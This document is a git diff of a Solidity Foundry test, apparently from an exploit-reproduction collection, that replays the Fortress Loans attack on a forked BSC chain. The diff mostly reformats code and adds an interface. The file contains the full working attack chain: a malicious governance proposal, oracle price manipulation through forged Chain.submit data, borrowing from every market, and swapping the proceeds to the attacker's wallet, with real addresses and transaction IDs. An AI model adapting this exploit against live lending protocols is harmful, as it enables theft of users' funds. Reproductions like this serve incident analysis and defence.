@@ -2,7 +2,104 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import {IERC20, IPriceFeed, IPancakeRouter, IUnitroller, IVyper} from "../interface.sol";
+
+import {IUnitroller} from "src/interfaces/IUnitroller.sol";
+import {IPriceFeed} from "src/interfaces/IPriceFeed.sol";
+import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+
+interface ArthUSDWrapper {
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+    event Deposit(address indexed who, uint256 amount);
+    event GmuOracleChange(address indexed oracle);
+    event OwnershipTransferred(
+        address indexed previousOwner,
+        address indexed newOwner
+    );
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Withdraw(address indexed who, uint256 amount);
+
+    function DOMAIN_SEPARATOR() external view returns (bytes32);
+    function PERMIT_TYPEHASH() external view returns (bytes32);
+    function TRANSFER_TYPEHASH() external view returns (bytes32);
+    function allowance(
+        address owner,
+        address spender
+    ) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function arth() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function decreaseAllowance(
+        address spender,
+        uint256 subtractedValue
+    ) external returns (bool);
+    function deposit(uint256 amount) external returns (bool);
+    function depositFor(
+        address account,
+        uint256 amount
+    ) external returns (bool);
+    function gmuOracle() external view returns (address);
+    function gonsDecimals() external view returns (uint256);
+    function gonsPerFragment() external view returns (uint256);
+    function gonsPercision() external view returns (uint256);
+    function increaseAllowance(
+        address spender,
+        uint256 addedValue
+    ) external returns (bool);
+    function name() external view returns (string memory);
+    function nonces(address) external view returns (uint256);
+    function owner() external view returns (address);
+    function renounceOwnership() external;
+    function setGMUOracle(address _gmuOracle) external;
+    function symbol() external view returns (string memory);
+    function totalSupply() external view returns (uint256);
+    function transfer(
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+    function transferAndCall(
+        address to,
+        uint256 value,
+        bytes memory data
+    ) external returns (bool);
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+    function transferOwnership(address newOwner) external;
+    function transferWithPermit(
+        address target,
+        address to,
+        uint256 value,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s
+    ) external returns (bool);
+    function underlyingBalanceOf(
+        address account
+    ) external view returns (uint256);
+    function withdraw(uint256 amount) external returns (bool);
+    function withdrawTo(
+        address account,
+        uint256 amount
+    ) external returns (bool);
+}
+interface IVyper {
+    function exchange_underlying(
+        int128,
+        int128,
+        uint256,
+        uint256,
+        address
+    ) external returns (uint256);
+}
 
 /* @KeyInfo -- Total Lost : 1,048 ETH + 400,000 DAI (~3,000,000 US$)
     Attacker Wallet : https://bscscan.com/address/0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad
@@ -45,7 +142,6 @@ address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
 address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
 
 interface IGovernorAlpha {
-
     function propose(
         address[] memory targets,
         uint256[] memory values,
@@ -63,11 +159,9 @@ interface IGovernorAlpha {
     function state(uint256 proposalId) external view;
 
     function proposalThreshold() external view returns (uint256);
-
 }
 
 interface IChain {
-
     function submit(
         uint32 _dataTimestamp,
         bytes32 _root,
@@ -77,49 +171,45 @@ interface IChain {
         bytes32[] memory _r,
         bytes32[] memory _s
     ) external;
-
 }
 
 interface FToken {}
 
 interface IFortressPriceOracle {
-
     function getUnderlyingPrice(FToken fToken) external view returns (uint256);
-
 }
 
 interface IFTS {
-
-    function approve(address spender, uint256 rawAmount) external returns (bool);
+    function approve(
+        address spender,
+        uint256 rawAmount
+    ) external returns (bool);
 
     function balanceOf(address account) external view returns (uint256);
 
     function delegate(address delegatee) external;
 
-    function getPriorVotes(address account, uint256 blockNumber) external view returns (uint96);
-
+    function getPriorVotes(
+        address account,
+        uint256 blockNumber
+    ) external view returns (uint96);
 }
 
 interface IfFTS {
-
     function mint(uint256 mintAmount) external returns (uint256);
 
     function balanceOf(address owner) external view returns (uint256);
-
 }
 
 interface IFBep20Delegator {
-
     function getCash() external view returns (uint256);
 
     function borrow(uint256 borrowAmount) external returns (uint256);
 
     function underlying() external returns (address);
-
 }
 
 interface IBorrowerOperations {
-
     function openTrove(
         uint256 _maxFee,
         uint256 _LUSDAmount,
@@ -128,13 +218,11 @@ interface IBorrowerOperations {
         address _lowerHint,
         address _frontEndTag
     ) external;
-
 }
 
 contract ProposalCreateFactory {}
 
 contract Attack is Test {
-
     /* Method 0x2b69be8e */
     function exploit() public {
         // Excute Proposal 11
@@ -144,8 +232,12 @@ contract Attack is Test {
         // Manipulate the price oracle
         bytes32 _root = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d886;
         bytes32[] memory _keys = new bytes32[](2);
-        _keys[0] = 0x000000000000000000000000000000000000000000000000004654532d555344;
-        _keys[1] = 0x0000000000000000000000000000000000000000000000004d4148412d555344;
+        _keys[
+            0
+        ] = 0x000000000000000000000000000000000000000000000000004654532d555344;
+        _keys[
+            1
+        ] = 0x0000000000000000000000000000000000000000000000004d4148412d555344;
         uint256[] memory _values = new uint256[](2);
         _values[0] = 4e34;
         _values[1] = 4e34;
@@ -155,24 +247,51 @@ contract Attack is Test {
         _v[2] = 28;
         _v[3] = 28;
         bytes32[] memory _r = new bytes32[](4);
-        _r[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d885;
-        _r[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d882;
-        _r[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d877;
-        _r[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d881;
+        _r[
+            0
+        ] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d885;
+        _r[
+            1
+        ] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d882;
+        _r[
+            2
+        ] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d877;
+        _r[
+            3
+        ] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d881;
         bytes32[] memory _s = new bytes32[](4);
-        _s[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d825;
-        _s[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d832;
-        _s[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d110;
-        _s[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d841;
-        IChain(ChainContract).submit(uint32(block.timestamp), _root, _keys, _values, _v, _r, _s);
+        _s[
+            0
+        ] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d825;
+        _s[
+            1
+        ] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d832;
+        _s[
+            2
+        ] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d110;
+        _s[
+            3
+        ] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d841;
+        IChain(ChainContract).submit(
+            uint32(block.timestamp),
+            _root,
+            _keys,
+            _values,
+            _v,
+            _r,
+            _s
+        );
         emit log_string("\t[info] Chain.submit() Success");
 
         // Check the FTS price is manipulated (from Fortress Loans perspective 📈)
         // This article explains how Chain.submit() affected FTS price: https://blog.csdn.net/Timmbe/article/details/124678475
         uint256 _checkpoint;
-        _checkpoint = IFortressPriceOracle(FortressPriceOracle).getUnderlyingPrice(FToken(fFTS));
+        _checkpoint = IFortressPriceOracle(FortressPriceOracle)
+            .getUnderlyingPrice(FToken(fFTS));
         assert(_checkpoint == 4e34); // make sure have same result as mainnet tx
-        emit log_string("\t[info] FortressPriceOracle.getUnderlyingPrice(FToken(fFTS)) Success");
+        emit log_string(
+            "\t[info] FortressPriceOracle.getUnderlyingPrice(FToken(fFTS)) Success"
+        );
 
         // Fetch price
         _checkpoint = IPriceFeed(PriceFeed).fetchPrice();
@@ -234,11 +353,16 @@ contract Attack is Test {
 
         IERC20(MAHA).approve(BorrowerOperations, type(uint256).max);
         IBorrowerOperations(BorrowerOperations).openTrove(
-            1e18, 1e27, IERC20(MAHA).balanceOf(address(this)), address(0), address(0), address(0)
+            1e18,
+            1e27,
+            IERC20(MAHA).balanceOf(address(this)),
+            address(0),
+            address(0),
+            address(0)
         );
 
         IERC20(ARTH).approve(ARTHUSD, type(uint256).max);
-        IERC20(ARTHUSD).deposit(1e27);
+        ArthUSDWrapper(ARTHUSD).deposit(1e27);
 
         IERC20(ARTHUSD).approve(Vyper1, type(uint256).max);
         IERC20(ARTHUSD).approve(Vyper2, type(uint256).max);
@@ -282,8 +406,14 @@ contract Attack is Test {
 
         // Swap each underlyAsset to attacker, Path: Asset->WBNB->USDT
         for (uint256 i = 0; i < 13; i++) {
-            if (address(Delegators[i]) == 0xE24146585E882B6b59ca9bFaaaFfED201E4E5491) continue; // Skip Fortress BNB  (fBNB), use singleHop swap later
-            if (address(Delegators[i]) == 0x554530ecDE5A4Ba780682F479BC9F64F4bBFf3a1) continue; // Skip Fortress USDT (fUSDT), transfer USDT later
+            if (
+                address(Delegators[i]) ==
+                0xE24146585E882B6b59ca9bFaaaFfED201E4E5491
+            ) continue; // Skip Fortress BNB  (fBNB), use singleHop swap later
+            if (
+                address(Delegators[i]) ==
+                0x554530ecDE5A4Ba780682F479BC9F64F4bBFf3a1
+            ) continue; // Skip Fortress USDT (fUSDT), transfer USDT later
 
             address underlyAsset = Delegators[i].underlying(); // Resolve underlyAsset address
             uint256 amount = IERC20(underlyAsset).balanceOf(address(this)); // Get each underlyAsset balance
@@ -294,7 +424,11 @@ contract Attack is Test {
             mulitHop[2] = USDT;
             IERC20(underlyAsset).approve(PancakeRouter, type(uint256).max);
             IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokens(
-                amount, 0, mulitHop, msg.sender, block.timestamp
+                amount,
+                0,
+                mulitHop,
+                msg.sender,
+                block.timestamp
             );
         }
 
@@ -302,9 +436,9 @@ contract Attack is Test {
         address[] memory singleHop = new address[](2);
         singleHop[0] = WBNB;
         singleHop[1] = USDT;
-        IPancakeRouter(payable(PancakeRouter)).swapExactETHForTokens{value: address(this).balance}(
-            0, singleHop, msg.sender, block.timestamp
-        );
+        IPancakeRouter(payable(PancakeRouter)).swapExactETHForTokens{
+            value: address(this).balance
+        }(0, singleHop, msg.sender, block.timestamp);
         emit log_string("\t[Pass] Swap BNB->USDT, amountOut send to attacker");
 
         // Transfer all USDT balance to attacker
@@ -319,17 +453,21 @@ contract Attack is Test {
     }
 
     receive() external payable {}
-
 }
 
 contract Hacker is Test {
-
     using stdStorage for StdStorage;
 
     constructor() {
         vm.createSelectFork("bsc", 17_490_837); // Fork BSC mainnet at block 17490837
-        emit log_string("This reproduce shows how attacker exploit Fortress Loan, cause ~3,000,000 US$ lost");
-        emit log_named_decimal_uint("[Start] Attacker Wallet USDT Balance", IERC20(USDT).balanceOf(address(this)), 18);
+        emit log_string(
+            "This reproduce shows how attacker exploit Fortress Loan, cause ~3,000,000 US$ lost"
+        );
+        emit log_named_decimal_uint(
+            "[Start] Attacker Wallet USDT Balance",
+            IERC20(USDT).balanceOf(address(this)),
+            18
+        );
         vm.label(attacker, "AttackerWallet");
         vm.label(address(this), "AttackContract");
         vm.label(USDT, "USDT");
@@ -357,7 +495,10 @@ contract Hacker is Test {
         ProposalCreateFactory PCreater = new ProposalCreateFactory();
         vm.stopPrank();
         vm.label(address(PCreater), "ProposalCreateFactory");
-        emit log_named_address("[Pass] Attacker created [ProposalCreater] contract", address(PCreater));
+        emit log_named_address(
+            "[Pass] Attacker created [ProposalCreater] contract",
+            address(PCreater)
+        );
 
         // txId : 0x12bea43496f35e7d92fb91bf2807b1c95fcc6fedb062d66678c0b5cfe07cc002
         // Do : Create Proposal Id 11
@@ -375,7 +516,11 @@ contract Hacker is Test {
 
         vm.prank(address(PCreater));
         IGovernorAlpha(GovernorAlpha).propose(
-            _target, _value, _signature, _calldata, "Add the FTS token as collateral."
+            _target,
+            _value,
+            _signature,
+            _calldata,
+            "Add the FTS token as collateral."
         );
         emit log_string("[Pass] Attacker created Proposal Id 11");
 
@@ -408,26 +553,43 @@ contract Hacker is Test {
         Attack attackContract = new Attack();
         vm.stopPrank();
         vm.label(address(attackContract), "AttackContract");
-        assert(address(attackContract) == 0xcD337b920678cF35143322Ab31ab8977C3463a45); // make sure deployAddr is same as mainnet
-        emit log_named_address("[Pass] Attacker created [AttackContract] contract", address(attackContract));
+        assert(
+            address(attackContract) ==
+                0xcD337b920678cF35143322Ab31ab8977C3463a45
+        ); // make sure deployAddr is same as mainnet
+        emit log_named_address(
+            "[Pass] Attacker created [AttackContract] contract",
+            address(attackContract)
+        );
 
         // txId : 0x6a04f47f839d6db81ba06b17b5abbc8b250b4c62e81f4a64aa6b04c0568dc501
         // Do : Send 3.0203 MahaDAO to Attack Contract
         // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
-        stdstore.target(MAHA).sig(IERC20(MAHA).balanceOf.selector).with_key(address(attackContract)).checked_write(
-            3_020_309_536_199_074_866
+        stdstore
+            .target(MAHA)
+            .sig(IERC20(MAHA).balanceOf.selector)
+            .with_key(address(attackContract))
+            .checked_write(3_020_309_536_199_074_866);
+        assert(
+            IERC20(MAHA).balanceOf(address(attackContract)) ==
+                3_020_309_536_199_074_866
         );
-        assert(IERC20(MAHA).balanceOf(address(attackContract)) == 3_020_309_536_199_074_866);
-        emit log_string("[Pass] Attacker send 3.0203 MahaDAO to [AttackContract] contract");
+        emit log_string(
+            "[Pass] Attacker send 3.0203 MahaDAO to [AttackContract] contract"
+        );
 
         // txId : 0xd127c438bdac59e448810b812ffc8910bbefc3ebf280817bd2ed1e57705588a0
         // Do : Send 100 FTS to Attack Contract
         // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
-        stdstore.target(FTS).sig(IFTS(FTS).balanceOf.selector).with_key(address(attackContract)).checked_write(
-            100 ether
-        );
+        stdstore
+            .target(FTS)
+            .sig(IFTS(FTS).balanceOf.selector)
+            .with_key(address(attackContract))
+            .checked_write(100 ether);
         assert(IFTS(FTS).balanceOf(address(attackContract)) == 100 ether);
-        emit log_string("[Pass] Attacker send 100 FTS to [AttackContract] contract");
+        emit log_string(
+            "[Pass] Attacker send 100 FTS to [AttackContract] contract"
+        );
 
         // txId : 0x13d19809b19ac512da6d110764caee75e2157ea62cb70937c8d9471afcb061bf
         // Do : Execute Proposal Id 11
@@ -456,12 +618,15 @@ contract Hacker is Test {
         vm.stopPrank();
         emit log_string("[Pass] Attacker destruct the Attack Contract");
 
-        emit log_named_decimal_uint("[End] Attacker Wallet USDT Balance", IERC20(USDT).balanceOf(attacker), 18);
+        emit log_named_decimal_uint(
+            "[End] Attacker Wallet USDT Balance",
+            IERC20(payable(USDT)).balanceOf(attacker),
+            18
+        );
 
         // You shold see attacker profit about 300K USDT
         // The USDT were moved after swapping across the cBridge(Celer Network), and swapped them into ETH and DAI.
     }
 
     receive() external payable {}
-
 }
